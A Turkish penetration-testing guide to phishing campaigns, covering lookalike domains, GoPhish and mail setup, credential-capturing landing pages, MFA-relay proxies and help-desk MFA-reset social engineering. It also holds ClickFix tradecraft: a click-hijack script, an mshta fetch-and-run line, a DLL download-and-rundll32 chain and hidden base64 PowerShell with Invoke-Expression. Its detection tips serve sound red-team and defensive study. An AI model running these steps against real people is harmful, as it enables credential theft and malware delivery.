# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. Victim hakkında keşif yapın
1. **victim domain**'ini seçin.
2. Victim tarafından kullanılan **login portallarını arayarak** bazı temel web enumeration işlemleri gerçekleştirin ve hangisini **taklit edeceğinize** **karar verin**.
3. **E-posta adreslerini bulmak** için biraz **OSINT** kullanın.
2. Ortamı hazırlayın
1. Phishing değerlendirmesi için kullanacağınız **domain'i satın alın**
2. **E-posta servisiyle** ilgili kayıtları (SPF, DMARC, DKIM, rDNS) **yapılandırın**
3. VPS'i **gophish** ile yapılandırın
3. Campaign'i hazırlayın
1. **E-posta şablonunu** hazırlayın
2. Kimlik bilgilerini çalacak **web sayfasını** hazırlayın
4. Campaign'i başlatın!

## Benzer domain adları oluşturma veya güvenilir bir domain satın alma

### Domain Adı Değiştirme Teknikleri

- **Keyword**: Domain adı, orijinal domain'in önemli bir **keyword'ünü içerir** (ör. zelster.com-management.com).<sup>[[1]](#references)</sup>
- **hypened subdomain**: Bir subdomain'deki **noktayı tireyle değiştirin** (ör. www-zelster.com).
- **New TLD**: Aynı domain'i **yeni bir TLD** kullanarak oluşturun (ör. zelster.org)
- **Homoglyph**: Domain adındaki bir harfi **benzer görünen harflerle değiştirir** (ör. zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** Domain adı içindeki **iki harfin yerini değiştirir** (ör. zelsetr.com).
- **Singularization/Pluralization**: Domain adının sonuna “s” ekler veya sondaki “s” harfini kaldırır (ör. zeltsers.com).
- **Omission**: Domain adındaki harflerden **birini kaldırır** (ör. zelser.com).
- **Repetition:** Domain adındaki harflerden **birini tekrarlar** (ör. zeltsser.com).
- **Replacement**: Homoglyph'e benzer, ancak daha az gizlidir. Domain adındaki harflerden birini, örneğin klavyede orijinal harfin yakınındaki bir harfle değiştirir (ör. zektser.com).
- **Subdomained**: Domain adının içine bir **nokta** ekler (ör. ze.lster.com).
- **Insertion**: Domain adına bir harf **ekler** (ör. zerltser.com).
- **Missing dot**: TLD'yi domain adına ekler (ör. zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Çeşitli faktörler (güneş patlamaları, kozmik ışınlar veya donanım hataları gibi) nedeniyle depolanan veya iletişim hâlindeki bazı bitlerin otomatik olarak **değişme olasılığı** vardır.

Bu kavram **DNS isteklerine uygulandığında**, **DNS server tarafından alınan domain'in**, başlangıçta istenen domain ile aynı olmaması mümkündür.

Örneğin, "windows.com" domain'indeki tek bir bit değişikliği, onu "windnws.com" olarak değiştirebilir.

Saldırganlar, victim'ın domain'ine benzeyen birden fazla bit-flipping domain'ini kaydederek bundan **yararlanabilir**. Amaçları, meşru kullanıcıları kendi altyapılarına yönlendirmektir.

Daha fazla bilgi için [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/) adresini okuyun.<sup>[[10]](#references)[[11]](#references)</sup>

### Güvenilir bir domain satın alma

Kullanabileceğiniz süresi dolmuş bir domain'i [https://www.expireddomains.net/](https://www.expireddomains.net) adresinde arayabilirsiniz.\
Satın alacağınız süresi dolmuş domain'in **zaten iyi bir SEO değerine sahip olduğundan** emin olmak için, aşağıdaki servislerde nasıl kategorize edildiğini kontrol edebilirsiniz:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## E-postaları keşfetme

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (%100 ücretsiz)
- [https://phonebook.cz/](https://phonebook.cz) (%100 ücretsiz)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Daha fazla geçerli e-posta adresi **keşfetmek** veya daha önce keşfettiklerinizi **doğrulamak** için victim'ın SMTP server'larına brute-force uygulayıp uygulayamayacağınızı kontrol edebilirsiniz. [E-posta adreslerinin nasıl doğrulanacağını/keşfedileceğini buradan öğrenin](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Ayrıca kullanıcıların e-postalarına erişmek için **herhangi bir web portalı kullanması** durumunda, portalın **username brute force** saldırılarına karşı savunmasız olup olmadığını kontrol edebileceğinizi ve mümkünse bu güvenlik açığından yararlanabileceğinizi unutmayın.

## GoPhish'i yapılandırma

### Kurulum

Bunu [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0) adresinden indirebilirsiniz.

İndirin, `/opt/gophish` içinde decompress edin ve `/opt/gophish/gophish` dosyasını çalıştırın.\
Çıktıda, 3333 portundaki admin user için bir password verilecektir. Bu nedenle ilgili porta erişin ve admin password'ünü değiştirmek için bu credentials'ı kullanın. Bu portu local'e tunnel etmeniz gerekebilir:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Yapılandırma

**TLS sertifikası yapılandırması**

Bu adımdan önce kullanacağınız **domain'i satın almış** olmanız ve domain'in **gophish** yapılandırdığınız **VPS'nin IP adresine yönleniyor** olması gerekir.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Mail yapılandırması**

Kurulumu başlatın: `apt-get install postfix`

Ardından domain'i aşağıdaki dosyalara ekleyin:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

Ayrıca **/etc/postfix/main.cf** içindeki aşağıdaki değişkenlerin değerlerini değiştirin:

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Son olarak **`/etc/hostname`** ve **`/etc/mailname`** dosyalarını domain adınızla değiştirin ve **VPS'inizi yeniden başlatın.**

Şimdi, `mail.<domain>` için VPS'in **IP adresini** gösteren bir **DNS A record** ve `mail.<domain>` adresini gösteren bir **DNS MX record** oluşturun.

Şimdi bir e-posta göndermeyi test edelim:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish yapılandırması**

gophish çalışmasını durdurun ve yapılandıralım.\
`/opt/gophish/config.json` dosyasını aşağıdaki şekilde değiştirin (https kullanımına dikkat edin):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**gophish servisini yapılandırma**

gophish service'ini otomatik olarak başlatılabilen ve bir service olarak yönetilebilen şekilde oluşturmak için, aşağıdaki içeriğe sahip `/etc/init.d/gophish` dosyasını oluşturabilirsiniz:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Şunları yaparak servisin yapılandırmasını tamamlayın ve kontrol edin:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Mail server ve domain yapılandırma

### Bekleyin ve meşru görünün

Bir domain ne kadar eskiyse spam olarak yakalanma olasılığı o kadar düşüktür. Bu nedenle phishing assessment işleminden önce mümkün olduğunca uzun süre (en az 1 hafta) beklemelisiniz. Ayrıca itibarlı bir sektör hakkında bir sayfa yerleştirirseniz elde edilen itibar daha iyi olacaktır.

Bir hafta beklemeniz gerekse bile her şeyi şimdi yapılandırmayı tamamlayabileceğinizi unutmayın.

### Reverse DNS (rDNS) kaydını yapılandırma

VPS'in IP adresini domain adına çözen bir rDNS (PTR) kaydı ayarlayın.

### Sender Policy Framework (SPF) Record

**Yeni domain için bir SPF record yapılandırmalısınız**. SPF record'un ne olduğunu bilmiyorsanız [**bu sayfayı okuyun**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

SPF policy'nizi oluşturmak için [https://www.spfwizard.net/](https://www.spfwizard.net) kullanabilirsiniz (VPS makinesinin IP'sini kullanın)

![Phishing domain için SPF record oluşturma SPF Wizard formu](<../../images/image (1037).png>)

Bu, domain içinde bir TXT record'unun içine ayarlanması gereken içeriktir:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain tabanlı Mesaj Kimlik Doğrulama, Raporlama ve Uyumluluk (DMARC) Kaydı

**Yeni domain için bir DMARC kaydı yapılandırmalısınız**. DMARC kaydının ne olduğunu bilmiyorsanız [**bu sayfayı okuyun**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

`_dmarc.<domain>` hostname'ini aşağıdaki içeriğe yönlendiren yeni bir DNS TXT kaydı oluşturmalısınız:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

**Yeni domain için bir DKIM yapılandırmalısınız**. DKIM kaydının ne olduğunu bilmiyorsanız [**bu sayfayı okuyun**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Bu tutorial şu kaynağı temel almaktadır: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> DKIM anahtarının oluşturduğu her iki B64 değerini birleştirmeniz gerekir:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### E-posta yapılandırma puanınızı test edin

Bunu [https://www.mail-tester.com/](https://www.mail-tester.com) kullanarak yapabilirsiniz\
Sayfaya erişin ve size verilen adrese bir e-posta gönderin:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Ayrıca `check-auth@verifier.port25.com` adresine bir e-posta gönderip **yanıtı okuyarak** **e-posta yapılandırmanızı kontrol edebilirsiniz** (bunun için **25** numaralı portu **açmanız** ve e-postayı root olarak gönderirseniz yanıtı _/var/mail/root_ dosyasında görmeniz gerekir).\
Tüm testleri geçtiğinizden emin olun:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Ayrıca **kontrolünüzdeki bir Gmail hesabına mesaj gönderebilir** ve Gmail gelen kutunuzdaki **e-postanın başlıklarını** kontrol edebilirsiniz; `Authentication-Results` başlık alanında `dkim=pass` bulunmalıdır.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Spamhouse Blacklist'inden Kaldırma

[www.mail-tester.com](https://www.mail-tester.com) sayfası, domain'inizin spamhouse tarafından engellenip engellenmediğini gösterebilir. Domain/IP adresinizin kaldırılmasını şu adresten talep edebilirsiniz: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Microsoft Blacklist'inden Kaldırma

​​Domain/IP adresinizin kaldırılmasını [https://sender.office.com/](https://sender.office.com) adresinden talep edebilirsiniz.

## GoPhish Campaign Oluşturma ve Başlatma

### Sending Profile

- Sender profile'ı tanımlamak için bir **isim belirleyin**
- Phishing e-postalarını hangi hesaptan göndereceğinize karar verin. Öneriler: _noreply, support, servicedesk, salesforce..._
- Username ve password alanlarını boş bırakabilirsiniz, ancak Ignore Certificate Errors seçeneğini işaretlediğinizden emin olun

![GoPhish Campaign Oluşturma ve Başlatma - Sending Profile: Username ve password alanlarını boş bırakabilirsiniz, ancak Ignore Certificate Errors seçeneğini işaretlediğinizden emin olun](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Her şeyin çalıştığını test etmek için "**Send Test Email**" işlevini kullanmanız önerilir.\
> Testler sırasında blacklist'e alınmanızı önlemek için **test e-postalarını 10 dakikalık mail adreslerine göndermenizi** öneririm.

### Email Template

- Template'i tanımlamak için bir **isim belirleyin**
- Ardından bir **subject** yazın (olağandışı hiçbir şey olmasın; normal bir e-postada okumayı bekleyebileceğiniz bir şey yazın)
- "**Add Tracking Image**" seçeneğinin işaretli olduğundan emin olun
- **Email template**'ini yazın (aşağıdaki örnekte olduğu gibi variable'lar kullanabilirsiniz):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
E-postanın **güvenilirliğini artırmak için**, istemciden gelen bir e-postadaki imzanın kullanılması önerilir. Öneriler:

- **Var olmayan bir adrese** e-posta gönderin ve yanıtta herhangi bir imza olup olmadığını kontrol edin.
- info@ex.com, press@ex.com veya public@ex.com gibi **public emails** arayın ve bunlara e-posta gönderip yanıtı bekleyin.
- **Bulunan geçerli** bir e-posta adresiyle iletişime geçmeyi deneyin ve yanıtı bekleyin.

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> Email Template ayrıca **gönderilecek dosyaların eklenmesine** izin verir. Özel olarak hazırlanmış bazı dosyaları/belgeleri kullanarak NTLM challenge'larını çalmak istiyorsanız [bu sayfayı okuyun](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Bir **name** yazın.
- Web sayfasının **HTML kodunu yazın**. Web sayfalarını **import** edebileceğinizi unutmayın.
- **Capture Submitted Data** ve **Capture Passwords** seçeneklerini işaretleyin.
- Bir **redirection** ayarlayın.

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Genellikle sayfanın HTML kodunu değiştirmeniz ve **sonuçları beğenene kadar** local ortamda (örneğin bir Apache server kullanarak) bazı testler yapmanız gerekir. Ardından bu HTML kodunu kutuya yazın.\
> HTML için bazı static resources (örneğin bazı CSS ve JS sayfaları) **kullanmanız** gerekiyorsa bunları _**/opt/gophish/static/endpoint**_ konumuna kaydedebilir ve ardından _**/static/\<filename>**_ üzerinden erişebilirsiniz.

> [!TIP]
> Redirection için kullanıcıları mağdurun legit ana web sayfasına **redirect** edebilir veya örneğin onları _/static/migration.html_ konumuna yönlendirebilir, 5 saniye boyunca bazı **spinning wheel (**[**https://loading.io/**](https://loading.io)**) görüntüleyebilir ve ardından işlemin başarılı olduğunu belirtebilirsiniz**.

### Users & Groups

- Bir name ayarlayın.
- **Verileri import edin** (örnekteki template'i kullanmak için her kullanıcının firstname, last name ve email address bilgilerine ihtiyacınız olduğunu unutmayın).

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

Son olarak bir name, email template, landing page, URL, sending profile ve group seçerek bir campaign oluşturun. URL'nin mağdurlara gönderilecek link olacağını unutmayın.

**Sending Profile'ın, son phishing e-postasının nasıl görüneceğini görmek için bir test e-postası göndermenize izin verdiğini** unutmayın:

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

Her şey hazır olduğunda campaign'i başlatın!

## Website Cloning

Herhangi bir nedenle web sitesini clone etmek istiyorsanız aşağıdaki sayfaya bakın:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

Bazı phishing assessment'larda (özellikle Red Teams için) ayrıca bir tür **backdoor içeren dosyalar** (belki bir C2 veya yalnızca bir authentication tetikleyecek bir şey) **göndermek** isteyebilirsiniz.\
Bazı örnekler için aşağıdaki sayfaya bakın:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Önceki attack oldukça zekicedir; gerçek bir web sitesini taklit eder ve kullanıcı tarafından girilen bilgileri toplar. Ne yazık ki kullanıcı doğru password'ü girmediyse veya taklit ettiğiniz application 2FA ile yapılandırılmışsa, **bu bilgiler kandırılan kullanıcıyı taklit etmenize izin vermez**.

[**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) ve [**muraena**](https://github.com/muraenateam/muraena) gibi tool'lar burada kullanışlıdır. Bu tool, MitM benzeri bir attack oluşturmanıza olanak tanır. Temel olarak attack şu şekilde çalışır:

1. Gerçek web sayfasının **login** formunu **taklit edersiniz**.
2. Kullanıcı **credentials** bilgilerini fake sayfanıza **gönderir** ve tool bunları gerçek web sayfasına göndererek **credentials bilgilerinin çalışıp çalışmadığını kontrol eder**.
3. Account 2FA ile yapılandırılmışsa MitM sayfası bunu ister ve **kullanıcı girdiğinde** tool bunu gerçek web sayfasına gönderir.
4. Kullanıcı authenticate olduktan sonra siz (attacker olarak), tool MitM gerçekleştirirken yapılan her etkileşime ait **credentials, 2FA, cookie ve tüm bilgileri ele geçirmiş** olursunuz.

### Via VNC

Mağduru orijinal web sitesiyle aynı görünüme sahip **malicious bir sayfaya göndermek** yerine, onu **gerçek web sayfasına bağlı bir browser içeren bir VNC session'a** gönderirseniz ne olur? Yaptıklarını görebilir, password'ü, kullanılan MFA'yı, cookie'leri... çalabilirsiniz.\
Bunu [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC) ile yapabilirsiniz.<sup>[[3]](#references)[[4]](#references)</sup>

## Detection the detection

Busted olup olmadığınızı anlamanın en iyi yollarından biri, **domain'inizi blacklists içinde aramaktır**. Listede görünüyorsa domain'iniz bir şekilde suspicions olarak tespit edilmiştir.\
Domain'inizin herhangi bir blacklist'te görünüp görünmediğini kontrol etmenin kolay bir yolu [https://malwareworld.com/](https://malwareworld.com) kullanmaktır.

Ancak mağdurun **wild'da aktif olarak suspicions phishing activity arayıp aramadığını** anlamanın başka yolları da vardır; bunlar aşağıda açıklanmıştır:


{{#ref}}
detecting-phising.md
{{#endref}}

Mağdurun domain'ine çok benzer bir ada sahip **bir domain satın alabilir** ve/veya sizin kontrolünüzdeki bir domain'in **subdomain'i için**, mağdurun domain'inin **keyword'ünü içeren** bir **certificate oluşturabilirsiniz**. **Mağdur** bu domain'lerle herhangi bir **DNS veya HTTP interaction** gerçekleştirirse, **suspicious domain'leri aktif olarak aradığını** anlayabilirsiniz ve çok stealth olmanız gerekir.<sup>[[2]](#references)</sup>

### Phishing'i değerlendirme

E-postanızın spam folder'a düşüp düşmeyeceğini veya engellenip engellenmeyeceğini ya da başarılı olup olmayacağını değerlendirmek için [**Phishious** ](https://github.com/Rices/Phishious) kullanın.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Modern intrusion set'ler, MFA'yı aşmak için email lure'larını tamamen atlayarak **doğrudan service-desk / identity-recovery workflow'unu hedefliyor**. Attack tamamen "living-off-the-land" yaklaşımındadır: operator geçerli credentials'lara sahip olduğunda built-in admin tooling kullanarak pivot eder; malware gerekmez.<sup>[[6]](#references)</sup>

### Attack flow
1. Mağduru recon edin.
* LinkedIn, data breaches, public GitHub vb. kaynaklardan kişisel ve kurumsal ayrıntıları harvest edin.
* High-value identity'leri (executives, IT, finance) belirleyin ve password / MFA reset için **tam help-desk process'ini** enumerate edin.
2. Real-time social engineering
* Target'ın kimliğine bürünerek help-desk'i telefonla, Teams üzerinden veya chat ile arayın (genellikle **spoofed caller-ID** veya **cloned voice** kullanarak).
* Knowledge-based verification'ı geçmek için önceden toplanan PII'yi sağlayın.
* Agent'ı **MFA secret'ını resetlemeye** veya kayıtlı bir mobile number üzerinde **SIM-swap** gerçekleştirmeye ikna edin.
3. Immediate post-access actions (gerçek vakalarda ≤60 min)
* Herhangi bir web SSO portalı üzerinden foothold oluşturun.
* Built-in'lerle AD / AzureAD'i enumerate edin (binary drop edilmez):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Ortamda zaten whitelist edilmiş **WMI**, **PsExec** veya legit **RMM** agent'larıyla lateral movement gerçekleştirin.

### Detection & Mitigation
* Help-desk identity recovery'yi **privileged operation** olarak değerlendirin; step-up auth ve manager approval isteyin.
* Şu durumlarda alert verecek **Identity Threat Detection & Response (ITDR)** / **UEBA** rules'ları deploy edin:
* MFA method değişti + new device / geo üzerinden authentication.
* Aynı principal'ın immediate elevation'ı (user-→-admin).
* Help-desk calls'ları kaydedin ve herhangi bir reset işleminden önce **zaten kayıtlı bir numaraya call-back** yapılmasını zorunlu kılın.
* **Just-In-Time (JIT) / Privileged Access** uygulayarak yeni resetlenen account'ların high-privilege token'ları otomatik olarak devralmamasını sağlayın.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crew'lar, **search engine'leri ve ad network'lerini delivery channel'a dönüştüren** mass attack'lerle high-touch operasyonların maliyetini dengeler.<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising**, `chromium-update[.]site` gibi fake bir sonucu search ads'lerin en üstüne taşır.
2. Mağdur küçük bir **first-stage loader** (genellikle JS/HTA/ISO) indirir. Unit 42 tarafından görülen örnekler:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader browser cookie'lerini ve credential DB'lerini exfiltrate eder, ardından ne deploy edileceğine *realtime* karar veren bir **silent loader** indirir:
* RAT (ör. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* Newly-registered domain'leri block edin ve e-mail'in yanı sıra *search-ads* için de **Advanced DNS / URL Filtering** uygulayın.
* Software installation'ı signed MSI / Store packages ile sınırlandırın; `HTA`, `ISO`, `VBS` execution'ını policy ile deny edin.
* Browser'ların installer açan child process'lerini monitor edin:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* First-stage loader'lar tarafından sıkça abuse edilen LOLBin'leri (ör. `regsvr32`, `curl`, `mshta`) hunt edin.

### Download-button click hijacking with TDS handoff
Bazı fake software portal'ları görünür download `href`'ini **real GitHub/release URL'sine** yönlendirmeye devam eder; ancak JavaScript'te **ilk** user interaction'ı hijack ederek mağduru bunun yerine bir **Traffic Distribution System (TDS)** chain'ine gönderir.<sup>[[9]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Temel özellikler:
- Hook genellikle `document` üzerinde **capture phase** (`true`) içinde çalışır; böylece site handler'larından önce tetiklenir.
- Chrome, yönlendirmeyi geçerli bir **user gesture** ile ilişkilendirmek ve popup-blocker bypass olasılığını artırmak için çoğunlukla `click` yerine `mousedown` kullanır.
- Bazı varyantlar önceden `about:blank` açar veya `<a target="_blank">` tıklamalarını taklit eder ve TDS URL'sini yalnızca daha sonra atar.
- Browser-side limitler genellikle `localStorage` içinde tutulur; bu nedenle **ilk tıklama** malware'e ulaşabilirken yenilemeler/tekrar denemeler benign görünen görünür linke geri dönebilir.
- TDS; referrer, giriş domain'i, GEO, browser/device fingerprint, VPN/datacenter kontrolleri, tıklama bağlamı ve session başına sayaçlar üzerinden filtreleme yapabilir. Bu da analyst replay'lerini deterministik olmaktan çıkarır.

Defender fikirleri:
- Görüntülenen `href` ile tıklama anında oluşturulan **gerçek** navigation target'ını karşılaştırın.
- `window.open`, `about:blank` veya synthetic anchor click'leri çevresinde hem `preventDefault()` hem de `stopImmediatePropagation()` çağıran `document.addEventListener(..., true)` handler'larını arayın.
- Aynı CloudFront/JS stage'ini yükleyen, yeni kaydedilmiş software-download domain kümelerini yüksek sinyalli bir SEO-poisoning/TDS pattern'i olarak değerlendirin.

### Sahte verification page'leri + archive görünümlü LOLBAS fetch'leri üzerinden ClickFix
Bazı TDS branch'leri, kurbanın aşağıdaki gibi güvenilir bir Windows binary'sini çalıştırmasını isteyen sahte bir verification page'inde (Cloudflare/IUAM tarzı) sona erer:<sup>[[9]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Notlar:
- `mshta.exe`, URL bir `.7z` arşivi gibi görünse bile yanıtın **başındaki HTA/VBScript'i** çalıştırır; sonuna eklenen arşiv verileri tamamen yanıltıcı olabilir.
- Sonraki aşamalar genellikle dosya türü hakkında yalan söylemeye devam eder (`.rtf` for PowerShell, `.asar` for Python, padding uygulanmış binary'ler içeren ZIP'ler) ve ardından **manual PE mapping / in-memory execution** aşamasına geçer.
- Bu zincirlerden birine yanıt veriyorsanız, **ilk başarılı çalıştırmadan itibaren ağ + belleği** koruyun: sonraki tekrar oynatmalar yalnızca zararsız bir installer/SFX yolu gösterebilir veya payload/key release ilk TDS oturumuna bağlandığı için başarısız olabilir.

### ClickFix DLL delivery tradecraft (sahte CERT güncellemesi)
* Yem: **Update** düğmesi adım adım “fix” talimatlarını gösteren klonlanmış ulusal CERT duyurusu. Kurbanlara, bir DLL indiren ve bunu `rundll32` aracılığıyla çalıştıran bir batch çalıştırmaları söylenir.<sup>[[12]](#references)</sup>
* Gözlemlenen tipik batch zinciri:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` payload'u `%TEMP%` konumuna bırakır, kısa bir bekleme network jitter'ını gizler, ardından `rundll32` export edilen entrypoint'i (`notepad`) çağırır.
* DLL, host kimliğini beacon olarak gönderir ve birkaç dakikada bir C2'yi sorgular. Remote tasking, **base64-encoded PowerShell** olarak gelir ve policy bypass ile gizli şekilde çalıştırılır:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Bu yöntem C2 esnekliğini korur (server, DLL'yi güncellemeden task'leri değiştirebilir) ve console window'larını gizler. `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` kombinasyonunu kullanan `rundll32.exe` alt süreçleri olan PowerShell işlemlerini arayın.
* Defenders, DLL yüklemesinden sonra `...page.php?tynor=<COMPUTER>sss<USER>` biçimindeki HTTP(S) callback'lerini ve 5 dakikalık polling aralıklarını arayabilir.

---

## AI-Enhanced Phishing Operations
Saldırganlar artık tamamen kişiselleştirilmiş lure'lar ve gerçek zamanlı etkileşim için **LLM & voice-clone API'lerini** zincirliyor.

| Katman | Threat actor tarafından örnek kullanım |
|-------|-------------|
|Automation|Rastgeleleştirilmiş ifadeler ve tracking link'leriyle >100 k email / SMS üretip gönderme.|
